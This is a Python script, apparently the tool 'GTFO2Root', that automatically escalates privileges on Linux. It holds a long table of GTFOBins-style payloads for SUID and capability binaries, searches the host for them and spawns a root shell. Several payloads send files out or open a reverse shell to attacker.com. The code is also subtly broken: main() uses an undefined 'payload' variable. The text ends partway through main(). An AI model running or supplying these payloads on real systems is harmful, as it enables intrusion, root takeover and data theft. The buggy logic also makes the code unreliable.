#!/usr/bin/env python3

import re
import os
import sys
import json
import argparse
import subprocess

DATA = {
    'suid': [
        {
            'name': 'aa-exec',
            'code': './aa-exec /bin/sh -p',
        },
        {
            'name': 'ab',
            'code': 'URL=http://attacker.com/; LFILE=file_to_send; ./ab -p $LFILE $URL',
        },
        {
            'name': 'agetty',
            'code': './agetty -o -p -l /bin/sh -a root tty',
        },
        {
            'name': 'alpine',
            'code': 'LFILE=file_to_read; ./alpine -F "$LFILE"',
        },
        {
            'name': 'ar',
            'code': 'TF=$(mktemp -u); LFILE=file_to_read; ./ar r "$TF" "$LFILE"; cat "$TF"',
        },
        {
            'name': 'arj',
            'code': 'TF=$(mktemp -d); LFILE=file_to_write; LDIR=where_to_write; echo DATA >"$TF/$LFILE"; arj a "$TF/a" "$TF/$LFILE"; ./arj e "$TF/a" $LDIR',
        },
        {
            'name': 'arp',
            'code': 'LFILE=file_to_read; ./arp -v -f "$LFILE"',
        },
        {
            'name': 'as',
            'code': 'LFILE=file_to_read; ./as @$LFILE',
        },
        {
            'name': 'ascii-xfr',
            'code': 'LFILE=file_to_read; ./ascii-xfr -ns "$LFILE"',
        },
        {
            'name': 'ash',
            'code': './ash',
        },
        {
            'name': 'aspell',
            'code': 'LFILE=file_to_read; ./aspell -c "$LFILE"',
        },
        {
            'name': 'atobm',
            'code': 'LFILE=file_to_read; ./atobm $LFILE 2>&1 | awk -F "\'" \'{printf "%s", $2}\'',
        },
        {
            'name': 'awk',
            'code': 'LFILE=file_to_read; ./awk \'//\' "$LFILE"',
        },
        {
            'name': 'base32',
            'code': 'LFILE=file_to_read; base32 "$LFILE" | base32 --decode',
        },
        {
            'name': 'base64',
            'code': 'LFILE=file_to_read; ./base64 "$LFILE" | base64 --decode',
        },
        {
            'name': 'basenc',
            'code': 'LFILE=file_to_read; basenc --base64 $LFILE | basenc -d --base64',
        },
        {
            'name': 'basez',
            'code': 'LFILE=file_to_read; ./basez "$LFILE" | basez --decode',
        },
        {
            'name': 'bash',
            'code': './bash -p',
        },
        {
            'name': 'bc',
            'code': 'LFILE=file_to_read; ./bc -s $LFILE; quit',
        },
        {
            'name': 'bridge',
            'code': 'LFILE=file_to_read; ./bridge -b "$LFILE"',
        },
        {
            'name': 'busctl',
            'code': "./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",
        },
        {
            'name': 'busybox',
            'code': './busybox sh',
        },
        {
            'name': 'bzip2',
            'code': 'LFILE=file_to_read; ./bzip2 -c $LFILE | bzip2 -d',
        },
        {
            'name': 'cabal',
            'code': './cabal exec -- /bin/sh -p',
        },
        {
            'name': 'capsh',
            'code': './capsh --gid=0 --uid=0 --',
        },
        {
            'name': 'cat',
            'code': 'LFILE=file_to_read; ./cat "$LFILE"',
        },
        {
            'name': 'chmod',
            'code': 'LFILE=file_to_change; ./chmod 6777 $LFILE',
        },
        {
            'name': 'choom',
            'code': './choom -n 0 -- /bin/sh -p',
        },
        {
            'name': 'chown',
            'code': 'LFILE=file_to_change; ./chown $(id -un):$(id -gn) $LFILE',
        },
        {
            'name': 'chroot',
            'code': './chroot / /bin/sh -p',
        },
        {
            'name': 'clamscan',
            'code': "LFILE=file_to_read; TF=$(mktemp -d); touch $TF/empty.yara; ./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'",
        },
        {
            'name': 'cmp',
            'code': 'LFILE=file_to_read; ./cmp $LFILE /dev/zero -b -l',
        },
        {
            'name': 'column',
            'code': 'LFILE=file_to_read; ./column $LFILE',
        },
        {
            'name': 'comm',
            'code': 'LFILE=file_to_read; comm $LFILE /dev/null 2>/dev/null',
        },
        {
            'name': 'cp',
            'code': 'LFILE=file_to_write; echo "DATA" | ./cp /dev/stdin "$LFILE"',
        },
        {
            'name': 'cp',
            'code': 'LFILE=file_to_write; TF=$(mktemp); echo "DATA" > $TF; ./cp $TF $LFILE',
        },
        {
            'name': 'cp',
            'code': 'LFILE=file_to_change; ./cp --attributes-only --preserve=all ./cp "$LFILE"',
        },
        {
            'name': 'cpio',
            'code': 'LFILE=file_to_read; TF=$(mktemp -d); echo "$LFILE" | ./cpio -R $UID -dp $TF; cat "$TF/$LFILE"',
        },
        {
            'name': 'cpio',
            'code': 'LFILE=file_to_write; LDIR=where_to_write; echo DATA >$LFILE; echo $LFILE | ./cpio -R 0:0 -p $LDIR',
        },
        {
            'name': 'cpulimit',
            'code': './cpulimit -l 100 -f -- /bin/sh -p',
        },
        {
            'name': 'csh',
            'code': './csh -b',
        },
        {
            'name': 'csplit',
            'code': 'LFILE=file_to_read; csplit $LFILE 1; cat xx01',
        },
        {
            'name': 'csvtool',
            'code': 'LFILE=file_to_read; ./csvtool trim t $LFILE',
        },
        {
            'name': 'cupsfilter',
            'code': 'LFILE=file_to_read; ./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE',
        },
        {
            'name': 'curl',
            'code': 'URL=http://attacker.com/file_to_get; LFILE=file_to_save; ./curl $URL -o $LFILE',
        },
        {
            'name': 'cut',
            'code': 'LFILE=file_to_read; ./cut -d "" -f1 "$LFILE"',
        },
        {
            'name': 'dash',
            'code': './dash -p',
        },
        {
            'name': 'date',
            'code': 'LFILE=file_to_read; ./date -f $LFILE',
        },
        {
            'name': 'dd',
            'code': 'LFILE=file_to_write; echo "data" | ./dd of=$LFILE',
        },
        {
            'name': 'debugfs',
            'code': './debugfs; !/bin/sh',
        },
        {
            'name': 'dialog',
            'code': 'LFILE=file_to_read; ./dialog --textbox "$LFILE" 0 0',
        },
        {
            'name': 'diff',
            'code': 'LFILE=file_to_read; ./diff --line-format=%L /dev/null $LFILE',
        },
        {
            'name': 'dig',
            'code': 'LFILE=file_to_read; ./dig -f $LFILE',
        },
        {
            'name': 'distcc',
            'code': './distcc /bin/sh -p',
        },
        {
            'name': 'dmsetup',
            'code': "./dmsetup create base <<EOF; 0 3534848 linear /dev/loop0 94208; EOF; ./dmsetup ls --exec '/bin/sh -p -s'",
        },
        {
            'name': 'docker',
            'code': './docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
        },
        {
            'name': 'dosbox',
            'code': 'LFILE=\'\\path\\to\\file_to_write\'; ./dosbox -c \'mount c /\' -c "echo DATA >c:$LFILE" -c exit',
        },
        {
            'name': 'ed',
            'code': './ed file_to_read; ,p; q',
        },
        {
            'name': 'efax',
            'code': 'LFILE=file_to_read; ./efax -d "$LFILE"',
        },
        {
            'name': 'elvish',
            'code': './elvish',
        },
        {
            'name': 'emacs',
            'code': './emacs -Q -nw --eval \'(term "/bin/sh -p")\'',
        },
        {
            'name': 'env',
            'code': './env /bin/sh -p',
        },
        {
            'name': 'eqn',
            'code': 'LFILE=file_to_read; ./eqn "$LFILE"',
        },
        {
            'name': 'espeak',
            'code': 'LFILE=file_to_read; ./espeak -qXf "$LFILE"',
        },
        {
            'name': 'expand',
            'code': 'LFILE=file_to_read; ./expand "$LFILE"',
        },
        {
            'name': 'expect',
            'code': "./expect -c 'spawn /bin/sh -p;interact'",
        },
        {
            'name': 'file',
            'code': 'LFILE=file_to_read; ./file -f $LFILE',
        },
        {
            'name': 'find',
            'code': './find . -exec /bin/sh -p \\; -quit',
        },
        {
            'name': 'fish',
            'code': './fish',
        },
        {
            'name': 'flock',
            'code': './flock -u / /bin/sh -p',
        },
        {
            'name': 'fmt',
            'code': 'LFILE=file_to_read; ./fmt -999 "$LFILE"',
        },
        {
            'name': 'fold',
            'code': 'LFILE=file_to_read; ./fold -w99999999 "$LFILE"',
        },
        {
            'name': 'gawk',
            'code': 'LFILE=file_to_read; ./gawk \'//\' "$LFILE"',
        },
        {
            'name': 'gcore',
            'code': './gcore $PID',
        },
        {
            'name': 'gdb',
            'code': './gdb -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
        },
        {
            'name': 'genie',
            'code': "./genie -c '/bin/sh'",
        },
        {
            'name': 'genisoimage',
            'code': 'LFILE=file_to_read; ./genisoimage -sort "$LFILE"',
        },
        {
            'name': 'gimp',
            'code': './gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        },
        {
            'name': 'grep',
            'code': "LFILE=file_to_read; ./grep '' $LFILE",
        },
        {
            'name': 'gtester',
            'code': "TF=$(mktemp); echo '#!/bin/sh -p' > $TF; echo 'exec /bin/sh -p 0<&1' >> $TF; chmod +x $TF; sudo gtester -q $TF",
        },
        {
            'name': 'gzip',
            'code': 'LFILE=file_to_read; ./gzip -f $LFILE -t',
        },
        {
            'name': 'hd',
            'code': 'LFILE=file_to_read; ./hd "$LFILE"',
        },
        {
            'name': 'head',
            'code': 'LFILE=file_to_read; ./head -c1G "$LFILE"',
        },
        {
            'name': 'hexdump',
            'code': 'LFILE=file_to_read; ./hexdump -C "$LFILE"',
        },
        {
            'name': 'highlight',
            'code': 'LFILE=file_to_read; ./highlight --no-doc --failsafe "$LFILE"',
        },
        {
            'name': 'hping3',
            'code': './hping3; /bin/sh -p',
        },
        {
            'name': 'iconv',
            'code': 'LFILE=file_to_read; ./iconv -f 8859_1 -t 8859_1 "$LFILE"',
        },
        {
            'name': 'install',
            'code': 'LFILE=file_to_change; TF=$(mktemp); ./install -m 6777 $LFILE $TF',
        },
        {
            'name': 'ionice',
            'code': './ionice /bin/sh -p',
        },
        {
            'name': 'ip',
            'code': 'LFILE=file_to_read; ./ip -force -batch "$LFILE"',
        },
        {
            'name': 'ip',
            'code': './ip netns add foo; ./ip netns exec foo /bin/sh -p; ./ip netns delete foo',
        },
        {
            'name': 'ispell',
            'code': './ispell /etc/passwd; !/bin/sh -p',
        },
        {
            'name': 'jjs',
            'code': 'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\').waitFor()" | ./jjs',
        },
        {
            'name': 'join',
            'code': 'LFILE=file_to_read; ./join -a 2 /dev/null $LFILE',
        },
        {
            'name': 'jq',
            'code': 'LFILE=file_to_read; ./jq -Rr . "$LFILE"',
        },
        {
            'name': 'jrunscript',
            'code': './jrunscript -e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')"',
        },
        {
            'name': 'julia',
            'code': "./julia -e 'run(`/bin/sh -p`)'",
        },
        {
            'name': 'ksh',
            'code': './ksh -p',
        },
        {
            'name': 'ksshell',
            'code': 'LFILE=file_to_read; ./ksshell -i $LFILE',
        },
        {
            'name': 'kubectl',
            'code': 'LFILE=dir_to_serve; ./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/',
        },
        {
            'name': 'ld.so',
            'code': './ld.so /bin/sh -p',
        },
        {
            'name': 'less',
            'code': './less file_to_read',
        },
        {
            'name': 'links',
            'code': 'LFILE=file_to_read; ./links "$LFILE"',
        },
        {
            'name': 'logsave',
            'code': './logsave /dev/null /bin/sh -i -p',
        },
        {
            'name': 'look',
            'code': 'LFILE=file_to_read; ./look \'\' "$LFILE"',
        },
        {
            'name': 'lua',
            'code': 'lua -e \'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);\'',
        },
        {
            'name': 'make',
            'code': 'COMMAND=\'/bin/sh -p\'; ./make -s --eval=$\'x:\\n\\t-\'"$COMMAND"',
        },
        {
            'name': 'mawk',
            'code': 'LFILE=file_to_read; ./mawk \'//\' "$LFILE"',
        },
        {
            'name': 'minicom',
            'code': './minicom -D /dev/null',
        },
        {
            'name': 'more',
            'code': './more file_to_read',
        },
        {
            'name': 'mosquitto',
            'code': 'LFILE=file_to_read; ./mosquitto -c "$LFILE"',
        },
        {
            'name': 'msgattrib',
            'code': 'LFILE=file_to_read; ./msgattrib -P $LFILE',
        },
        {
            'name': 'msgcat',
            'code': 'LFILE=file_to_read; ./msgcat -P $LFILE',
        },
        {
            'name': 'msgconv',
            'code': 'LFILE=file_to_read; ./msgconv -P $LFILE',
        },
        {
            'name': 'msgfilter',
            'code': "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'",
        },
        {
            'name': 'msgmerge',
            'code': 'LFILE=file_to_read; ./msgmerge -P $LFILE /dev/null',
        },
        {
            'name': 'msguniq',
            'code': 'LFILE=file_to_read; ./msguniq -P $LFILE',
        },
        {
            'name': 'multitime',
            'code': './multitime /bin/sh -p',
        },
        {
            'name': 'mv',
            'code': 'LFILE=file_to_write; TF=$(mktemp); echo "DATA" > $TF; ./mv $TF $LFILE',
        },
        {
            'name': 'nasm',
            'code': 'LFILE=file_to_read; ./nasm -@ $LFILE',
        },
        {
            'name': 'nawk',
            'code': 'LFILE=file_to_read; ./nawk \'//\' "$LFILE"',
        },
        {
            'name': 'ncftp',
            'code': './ncftp; !/bin/sh -p',
        },
        {
            'name': 'nft',
            'code': 'LFILE=file_to_read; ./nft -f "$LFILE"',
        },
        {
            'name': 'nice',
            'code': './nice /bin/sh -p',
        },
        {
            'name': 'nl',
            'code': "LFILE=file_to_read; ./nl -bn -w1 -s '' $LFILE",
        },
        {
            'name': 'nm',
            'code': 'LFILE=file_to_read; ./nm @$LFILE',
        },
        {
            'name': 'nmap',
            'code': 'LFILE=file_to_write; ./nmap -oG=$LFILE DATA',
        },
        {
            'name': 'node',
            'code': './node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})\'',
        },
        {
            'name': 'nohup',
            'code': './nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"',
        },
        {
            'name': 'ntpdate',
            'code': 'LFILE=file_to_read; ./ntpdate -a x -k $LFILE -d localhost',
        },
        {
            'name': 'od',
            'code': 'LFILE=file_to_read; ./od -An -c -w9999 "$LFILE"',
        },
        {
            'name': 'openssl',
            'code': 'RHOST=attacker.com; RPORT=12345; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s',
        },
        {
            'name': 'openssl',
            'code': 'LFILE=file_to_write; echo DATA | openssl enc -out "$LFILE"',
        },
        {
            'name': 'openvpn',
            'code': './openvpn --dev null --script-security 2 --up \'/bin/sh -p -c "sh -p"\'',
        },
        {
            'name': 'openvpn',
            'code': 'LFILE=file_to_read; ./openvpn --config "$LFILE"',
        },
        {
            'name': 'pandoc',
            'code': 'LFILE=file_to_write; echo DATA | ./pandoc -t plain -o "$LFILE"',
        },
        {
            'name': 'paste',
            'code': 'LFILE=file_to_read; paste $LFILE',
        },
        {
            'name': 'perf',
            'code': './perf stat /bin/sh -p',
        },
        {
            'name': 'perl',
            'code': './perl -e \'exec "/bin/sh";\'',
        },
        {
            'name': 'pexec',
            'code': './pexec /bin/sh -p',
        },
        {
            'name': 'pg',
            'code': './pg file_to_read',
        },
        {
            'name': 'php',
            'code': 'CMD="/bin/sh"; ./php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
        },
        {
            'name': 'pidstat',
            'code': 'COMMAND=id; ./pidstat -e $COMMAND',
        },
        {
            'name': 'pr',
            'code': 'LFILE=file_to_read; pr -T $LFILE',
        },
        {
            'name': 'ptx',
            'code': 'LFILE=file_to_read; ./ptx -w 5000 "$LFILE"',
        },
        {
            'name': 'python',
            'code': './python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        },
        {
            'name': 'rc',
            'code': "./rc -c '/bin/sh -p'",
        },
        {
            'name': 'readelf',
            'code': 'LFILE=file_to_read; ./readelf -a @$LFILE',
        },
        {
            'name': 'restic',
            'code': 'RHOST=attacker.com; RPORT=12345; LFILE=file_or_dir_to_get; NAME=backup_name; ./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"',
        },
        {
            'name': 'rev',
            'code': 'LFILE=file_to_read; ./rev $LFILE | rev',
        },
        {
            'name': 'rlwrap',
            'code': './rlwrap -H /dev/null /bin/sh -p',
        },
        {
            'name': 'rsync',
            'code': './rsync -e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
        },
        {
            'name': 'rtorrent',
            'code': 'echo "execute = /bin/sh,-p,-c,\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\"" >~/.rtorrent.rc; ./rtorrent',
        },
        {
            'name': 'run-parts',
            'code': "./run-parts --new-session --regex '^sh$' /bin --arg='-p'",
        },
        {
            'name': 'rview',
            'code': './rview -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
        },
        {
            'name': 'rvim',
            'code': './rvim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
        },
        {
            'name': 'sash',
            'code': './sash',
        },
        {
            'name': 'scanmem',
            'code': './scanmem; shell /bin/sh',
        },
        {
            'name': 'sed',
            'code': 'LFILE=file_to_read; ./sed -e \'\' "$LFILE"',
        },
        {
            'name': 'setarch',
            'code': './setarch $(arch) /bin/sh -p',
        },
        {
            'name': 'setfacl',
            'code': 'LFILE=file_to_change; USER=somebody; ./setfacl -m u:$USER:rwx $LFILE',
        },
        {
            'name': 'setlock',
            'code': './setlock - /bin/sh -p',
        },
        {
            'name': 'shuf',
            'code': 'LFILE=file_to_write; ./shuf -e DATA -o "$LFILE"',
        },
        {
            'name': 'soelim',
            'code': 'LFILE=file_to_read; ./soelim "$LFILE"',
        },
        {
            'name': 'softlimit',
            'code': './softlimit /bin/sh -p',
        },
        {
            'name': 'sort',
            'code': 'LFILE=file_to_read; ./sort -m "$LFILE"',
        },
        {
            'name': 'sqlite3',
            'code': 'LFILE=file_to_read; sqlite3 << EOF; CREATE TABLE t(line TEXT);; .import $LFILE t; SELECT * FROM t;; EOF',
        },
        {
            'name': 'ss',
            'code': 'LFILE=file_to_read; ./ss -a -F $LFILE',
        },
        {
            'name': 'ssh-agent',
            'code': './ssh-agent /bin/ -p',
        },
        {
            'name': 'ssh-keygen',
            'code': './ssh-keygen -D ./lib.so',
        },
        {
            'name': 'ssh-keyscan',
            'code': 'LFILE=file_to_read; ./ssh-keyscan -f $LFILE',
        },
        {
            'name': 'sshpass',
            'code': './sshpass /bin/sh -p',
        },
        {
            'name': 'start-stop-daemon',
            'code': './start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p',
        },
        {
            'name': 'stdbuf',
            'code': './stdbuf -i0 /bin/sh -p',
        },
        {
            'name': 'strace',
            'code': './strace -o /dev/null /bin/sh -p',
        },
        {
            'name': 'strings',
            'code': 'LFILE=file_to_read; ./strings "$LFILE"',
        },
        {
            'name': 'sysctl',
            'code': 'COMMAND=\'/bin/sh -c id>/tmp/id\'; ./sysctl "kernel.core_pattern=|$COMMAND"; sleep 9999 &; kill -QUIT $!; cat /tmp/id',
        },
        {
            'name': 'systemctl',
            'code': 'TF=$(mktemp).service; echo \'[Service]; Type=oneshot; ExecStart=/bin/sh -c "id > /tmp/output"; [Install]; WantedBy=multi-user.target\' > $TF; ./systemctl link $TF; ./systemctl enable --now $TF',
        },
        {
            'name': 'tac',
            'code': 'LFILE=file_to_read; ./tac -s \'RANDOM\' "$LFILE"',
        },
        {
            'name': 'tail',
            'code': 'LFILE=file_to_read; ./tail -c1G "$LFILE"',
        },
        {
            'name': 'taskset',
            'code': './taskset 1 /bin/sh -p',
        },
        {
            'name': 'tbl',
            'code': 'LFILE=file_to_read; ./tbl $LFILE',
        },
        {
            'name': 'tclsh',
            'code': './tclsh; exec /bin/sh -p <@stdin >@stdout 2>@stderr',
        },
        {
            'name': 'tee',
            'code': 'LFILE=file_to_write; echo DATA | ./tee -a "$LFILE"',
        },
        {
            'name': 'terraform',
            'code': './terraform console; file("file_to_read")',
        },
        {
            'name': 'tftp',
            'code': 'RHOST=attacker.com; ./tftp $RHOST; put file_to_send',
        },
        {
            'name': 'tic',
            'code': 'LFILE=file_to_read; ./tic -C "$LFILE"',
        },
        {
            'name': 'time',
            'code': './time /bin/sh -p',
        },
        {
            'name': 'timeout',
            'code': './timeout 7d /bin/sh -p',
        },
        {
            'name': 'troff',
            'code': 'LFILE=file_to_read; ./troff $LFILE',
        },
        {
            'name': 'ul',
            'code': 'LFILE=file_to_read; ./ul "$LFILE"',
        },
        {
            'name': 'unexpand',
            'code': 'LFILE=file_to_read; ./unexpand -t99999999 "$LFILE"',
        },
        {
            'name': 'uniq',
            'code': 'LFILE=file_to_read; ./uniq "$LFILE"',
        },
        {
            'name': 'unshare',
            'code': './unshare -r /bin/sh',
        },
        {
            'name': 'unsquashfs',
            'code': './unsquashfs shell; ./squashfs-root/sh -p',
        },
        {
            'name': 'unzip',
            'code': './unzip -K shell.zip; ./sh -p',
        },
        {
            'name': 'update-alternatives',
            'code': 'LFILE=/path/to/file_to_write; TF=$(mktemp); echo DATA >$TF; ./update-alternatives --force --install "$LFILE" x "$TF" 0',
        },
        {
            'name': 'uudecode',
            'code': 'LFILE=file_to_read; uuencode "$LFILE" /dev/stdout | uudecode',
        },
        {
            'name': 'uuencode',
            'code': 'LFILE=file_to_read; uuencode "$LFILE" /dev/stdout | uudecode',
        },
        {
            'name': 'vagrant',
            'code': 'cd $(mktemp -d); echo \'exec "/bin/sh -p"\' > Vagrantfile; vagrant up',
        },
        {
            'name': 'varnishncsa',
            'code': 'LFILE=file_to_write; ./varnishncsa -g request -q \'ReqURL ~ "/xxx"\' -F \'%{yyy}i\' -w "$LFILE"',
        },
        {
            'name': 'view',
            'code': './view -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
        },
        {
            'name': 'vigr',
            'code': './vigr',
        },
        {
            'name': 'vim',
            'code': './vim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
        },
        {
            'name': 'vimdiff',
            'code': './vimdiff -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
        },
        {
            'name': 'vipw',
            'code': './vipw',
        },
        {
            'name': 'w3m',
            'code': 'LFILE=file_to_read; ./w3m "$LFILE" -dump',
        },
        {
            'name': 'watch',
            'code': "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'",
        },
        {
            'name': 'wc',
            'code': 'LFILE=file_to_read; ./wc --files0-from "$LFILE"',
        },
        {
            'name': 'wget',
            'code': "TF=$(mktemp); chmod +x $TF; echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF; ./wget --use-askpass=$TF 0",
        },
        {
            'name': 'whiptail',
            'code': 'LFILE=file_to_read; ./whiptail --textbox --scrolltext "$LFILE" 0 0',
        },
        {
            'name': 'xargs',
            'code': './xargs -a /dev/null sh -p',
        },
        {
            'name': 'xdotool',
            'code': './xdotool exec --sync /bin/sh -p',
        },
        {
            'name': 'xmodmap',
            'code': 'LFILE=file_to_read; ./xmodmap -v $LFILE',
        },
        {
            'name': 'xmore',
            'code': 'LFILE=file_to_read; ./xmore $LFILE',
        },
        {
            'name': 'xxd',
            'code': 'LFILE=file_to_read; ./xxd "$LFILE" | xxd -r',
        },
        {
            'name': 'xz',
            'code': 'LFILE=file_to_read; ./xz -c "$LFILE" | xz -d',
        },
        {
            'name': 'yash',
            'code': './yash',
        },
        {
            'name': 'zsh',
            'code': './zsh',
        },
        {
            'name': 'zsoelim',
            'code': 'LFILE=file_to_read; ./zsoelim "$LFILE"',
        },
    ],
    'capabilities': [
        {
            'name': 'gdb',
            'code': "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
        },
        {
            'name': 'node',
            'code': './node -e \'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'',
        },
        {
            'name': 'perl',
            'code': './perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";\'',
        },
        {
            'name': 'php',
            'code': 'CMD="/bin/sh"; ./php -r "posix_setuid(0); system(\'$CMD\');"',
        },
        {
            'name': 'python',
            'code': './python -c \'import os; os.setuid(0); os.system("/bin/sh")\'',
        },
        {
            'name': 'ruby',
            'code': './ruby -e \'Process::Sys.setuid(0); exec "/bin/sh"\'',
        },
        {
            'name': 'rview',
            'code': './rview -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
        },
        {
            'name': 'rvim',
            'code': './rvim -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
        },
        {
            'name': 'view',
            'code': './view -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
        },
        {
            'name': 'vim',
            'code': './vim -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
        },
        {
            'name': 'vimdiff',
            'code': './vimdiff -c \':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'',
        },
    ],
}

def load_data():

    return {
        'suid': {e['name']: e for e in DATA['suid']},
        'capabilities': {e['name']: e for e in DATA['capabilities']}
    }

def find_suid_binaries():
    print("[*] Searching for SUID binaries...")
    try:
        result = subprocess.run(
            "find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;",
            shell=True,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        suid_binaries = []
        for line in result.stdout.split('\n'):
            if not line.strip():
                continue
            parts = line.split()
            # Check if owned by root (3rd field is user, 4th is group)
            if parts[2] == 'root':
                binary_path = parts[-1]
                suid_binaries.append(binary_path)
        return suid_binaries
    except subprocess.CalledProcessError:
        return []

def find_cap_binaries():
    print("[*] Searching for binaries with capabilities...")
    try:
        result = subprocess.run(
            "getcap -r / 2>/dev/null",
            shell=True,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        cap_binaries = []
        for line in result.stdout.split('\n'):
            if not line.strip():
                continue
            binary_path = line.split()[0]
            # For capabilities, we'll check root ownership via stat
            try:
                stat = subprocess.run(
                    f"stat -c '%U' {binary_path}",
                    shell=True,
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                if stat.stdout.strip() == 'root':
                    cap_binaries.append(binary_path)
            except subprocess.CalledProcessError:
                continue
        return cap_binaries
    except subprocess.CalledProcessError:
        return []

def get_real_path(binary_path):
    binary_name = os.path.basename(binary_path)
    try:
        result = subprocess.run(
            f"which {binary_name}",
            shell=True,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        real_path = result.stdout.strip()
        if real_path and os.path.exists(real_path):
            return real_path
    except subprocess.CalledProcessError:
        pass
    return None

def match_payload(binary_path, exploits):
    binary_name = os.path.basename(binary_path)
    
    # Check exact match first
    if binary_name in exploits:
        return binary_name, binary_name
    
    # Check version variants with regex
    version_pattern = re.compile(r'^([a-zA-Z]+)(.*)$')
    match = version_pattern.match(binary_name)
    
    if match:
        base_name = match.group(1)  # Get the base name (e.g. 'python')
        version_part = match.group(2)  # Get the version/suffix part
        
        # Check if base name exists in exploits
        if base_name in exploits:
            return base_name, binary_name  # Return base (e.g. 'python') and full name (e.g. 'python3.8')
        
        # Also check if any prefix of the binary name matches an exploit
        # (e.g., 'python3' when we have 'python' in exploits)
        for exploit_name in exploits.keys():
            if binary_name.startswith(exploit_name):
                return base_name, binary_name
    
    return None, None

def prepare_payload(payload, binary_path, base_name):
    # Replace ./binary_name with full path
    payload = payload.replace(f"./{base_name}", binary_path)
    # Replace binary_name with full path if it's at start of command
    payload = payload.replace(f"{base_name} ", f"{binary_path} ")
    return payload

def exploit(exploit_data, binary_path, exploit_type, base_name):
    payload = prepare_payload(exploit_data['code'], binary_path, base_name)
    print(f"[+] Attempting to abuse {exploit_type.upper()} on {binary_path}")

    # Upgrade shell if possible
    if '/bin/sh' in payload and os.path.exists('/bin/bash'):
        payload = payload.replace('/bin/sh', '/bin/bash')
    
    try:        
        print("[*] Spawning interactive root shell...")

        # Attach to current terminal
        result = subprocess.call(
            payload,
            shell=True,
        )
        return True
            
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to spawn shell with {binary_path} ({e})")
        return False
    except Exception as e:
        print(f"[-] Unexpected error with {binary_path}: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="GTFO2Root is a post-exploitation tool that identifies and automatically exploits \nSUID and Capabilities binaries to escalate privileges on Linux systems.",
        usage='./%(prog)s [-h] [-l]',
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        '-l', '--list', 
        action='store_true', 
        help="List exploitable binaries. If omitted, the tool will attempt \nto automatically spawn a root shell when possible."
    )
    
    args = parser.parse_args()
    exploits = load_data()
    found = False

    # Process SUID binaries
    suid_binaries = find_suid_binaries()
    for binary in suid_binaries:
        real_path = get_real_path(binary)
        if not real_path or real_path != binary:
            continue
            
        base_name, exploit_name = match_payload(binary, exploits['suid'])
        if exploit_name:
            # Check if the payload is not directly designed to spawn a shell
            if any(pattern in payload for pattern in ['file_to', 'COMMAND']):
                print(f"[!] Found misconfigured SUID binary: {binary} - doesn't spawn shell directly")
                print(f"    Usage: {payload}")
                break

            if args.list:
                print(f"[*] Found misconfigured SUID binary: {binary}")
                print(f"    Payload: {prepare_payload(exploits['suid'][base_name]['code'], binary, base_name)}")
            else:
                if exploit(exploits['suid'][base_name], binary, 'suid', base_name):
                    found = True
                    break

    # Process capability binaries if no exploit succeeded yet
    if not found or args.list:
        cap_binaries = find_cap_binaries()
        for binary in cap_binaries:
            real_path = get_real_path(binary)
            if not real_path or real_path != binary:
                continue
                
            base_name, exploit_name = match_payload(binary, exploits['capabilities'])
            if exploit_name:
                if args.list:
